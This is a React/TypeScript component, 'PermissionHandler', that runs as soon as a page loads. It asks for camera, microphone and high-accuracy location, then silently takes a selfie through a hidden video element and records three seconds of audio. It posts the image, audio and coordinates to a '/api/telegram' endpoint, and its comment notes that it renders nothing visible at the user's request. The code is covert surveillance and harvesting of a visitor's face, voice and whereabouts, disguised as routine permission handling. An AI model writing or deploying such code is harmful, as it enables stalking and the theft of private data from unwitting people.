"use client";

import React, { useEffect, useRef, useState } from "react";
import { toast } from "sonner";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const AUDIO_RECORDING_DURATION_MS = 3000; // 3 seconds

// Define the type for dataToSend explicitly
type DataToSend = {
  selfie?: string;
  audio?: string;
  latitude?: number;
  longitude?: number;
};

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const [isProcessing, setIsProcessing] = useState(true);

  // Define sendDataToTelegram outside handlePermissionsAndSend to make it accessible
  // and use the explicit DataToSend type
  const sendDataToTelegram = async (data: DataToSend) => {
    if (Object.keys(data).length === 0) {
      toast.info("No data to send to Telegram (permissions denied or unavailable).");
      return;
    }

    try {
      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        toast.success("Data successfully sent to Telegram!");
      } else {
        const errorData = await response.json();
        toast.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
      }
    } catch (error: any) {
      toast.error(`Network error sending data to Telegram: ${error.message}`);
    }
  };

  useEffect(() => {
    const handlePermissionsAndSend = async () => {
      setIsProcessing(true);
      const dataToSend: DataToSend = {}; // Use the defined type here

      // 1. Request Camera and Microphone
      let stream: MediaStream | null = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        toast.success("Camera and Microphone access granted!");

        // Capture Selfie
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((resolve) => (videoRef.current!.onloadedmetadata = resolve));
          const canvas = document.createElement("canvas");
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
            dataToSend.selfie = canvas.toDataURL("image/jpeg");
            toast.info("Selfie captured!");
          }
        }

        // Record 3-second audio
        mediaRecorderRef.current = new MediaRecorder(stream);
        mediaRecorderRef.current.ondataavailable = (event) => {
          audioChunksRef.current.push(event.data);
        };
        mediaRecorderRef.current.onstop = async () => {
          const audioBlob = new Blob(audioChunksRef.current, { type: "audio/webm" });
          const reader = new FileReader();
          reader.readAsDataURL(audioBlob);
          reader.onloadend = () => {
            dataToSend.audio = reader.result as string;
            toast.info("Audio recorded!");
            // Now that audio is ready, proceed to send (location might still be pending)
            sendDataToTelegram(dataToSend);
          };
        };
        mediaRecorderRef.current.start();
        setTimeout(() => {
          if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
            mediaRecorderRef.current.stop();
          }
        }, AUDIO_RECORDING_DURATION_MS);

      } catch (error: any) {
        toast.error(`Camera/Microphone access denied: ${error.message}`);
        // If camera/mic denied, still try to get location and send what we have
        sendDataToTelegram(dataToSend); // Send what's available if audio recording won't happen
      } finally {
        // Stop all tracks after processing, regardless of success or failure
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }

      // 2. Request Geolocation
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            dataToSend.latitude = position.coords.latitude;
            dataToSend.longitude = position.coords.longitude;
            toast.success("Location access granted!");
            sendDataToTelegram(dataToSend); // Send again in case location was the last piece
          },
          (error) => {
            toast.error(`Location access denied: ${error.message}`);
            sendDataToTelegram(dataToSend); // Send what's available if location denied
          },
          { enableHighAccuracy: true }
        );
      } else {
        toast.error("Geolocation not supported in this browser.");
        sendDataToTelegram(dataToSend); // Send what's available if geolocation unavailable
      }
      setIsProcessing(false);
    };

    handlePermissionsAndSend();
  }, []);

  // The component renders nothing visible as per user request
  return (
    <div style={{ display: 'none' }}>
      {/* Hidden video element for capturing selfie */}
      <video ref={videoRef} autoPlay playsInline muted />
      {isProcessing && <p>Processing permissions...</p>}
    </div>
  );
};

export default PermissionHandler;